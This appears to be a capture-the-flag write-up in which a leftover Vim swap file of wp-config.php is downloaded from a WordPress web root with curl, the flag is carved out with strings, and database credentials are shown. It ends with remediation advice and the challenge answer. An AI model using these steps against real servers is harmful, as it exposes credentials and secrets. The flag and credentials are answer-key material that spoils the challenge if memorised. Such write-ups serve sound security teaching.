#### Challenge:

Hi Senior Researcher,

something has gone wrong with the <code>science-hotnews.nren.tcc</code> server, and the site has suddenly gone offline. The administrator had to fix things manually to get the news server back online.

Your task is to find out whether the administrator left any relics behind.

Stay curious!

---

#### Solution:

The flavor text is a spec: the admin "fixed things manually" and we're asked whether they "left any
relics behind." Manual editing on a server almost always means an **editor swap/backup file** left in
the web root — the classic being a Vim `.swp`.

**1. Recon the host.** `science-hotnews.nren.tcc` (canonical `wp-srv.nren.tcc`) only serves a static
"under reconstruction" `index.html`, but it is really a **live WordPress** install that the admin took
offline behind the placeholder page.

```bash
H=science-hotnews.nren.tcc
curl -sI http://$H/                 # static index.html placeholder
curl -s  http://$H/wp-login.php | head   # WP is still there underneath
```

**2. Hunt for the relic.** Editing `wp-config.php` in Vim leaves `/.wp-config.php.swp` (dot-prefixed,
in the docroot). It's directly downloadable:

```bash
curl -s "http://$H/.wp-config.php.swp" -o wp-config.php.swp
file wp-config.php.swp        # Vim swap file, version 7.4, ... path: ~/wp-config.php
```

**3. Recover the config and read the flag.** The swap file embeds the full buffer; the flag was
planted as the `AUTH_KEY` salt. Carve it straight out:

```bash
strings wp-config.php.swp | grep -oE 'FLAG\{[^}]*\}'
# FLAG{Qdq3-LPjI-UQog-K1Ox}
```

(`vim -r wp-config.php.swp` reconstructs the whole file if you want the surrounding context.)

**Bonus — impact.** The same recovered config leaks the real DB credentials (not the flag, but shows
why leaving the relic is dangerous): `DB_HOST=db.internal.nren.tcc`, `DB_USER=wp_admin`,
`DB_PASSWORD=S3cr3t-db-p4ss!2026`, `DB_NAME=wp_recon`.

**Fix:** never leave editor swap/backup files (`.swp`, `~`, `.bak`, `.orig`) in a web-served
directory — any `.swp` is trivially recoverable with `vim -r`/`strings`; keep secrets (and config
files) out of the docroot entirely, and clean up after manual edits.

---

<details><summary>FLAG:</summary>

```
FLAG{Qdq3-LPjI-UQog-K1Ox}
```

</details>
<br/>
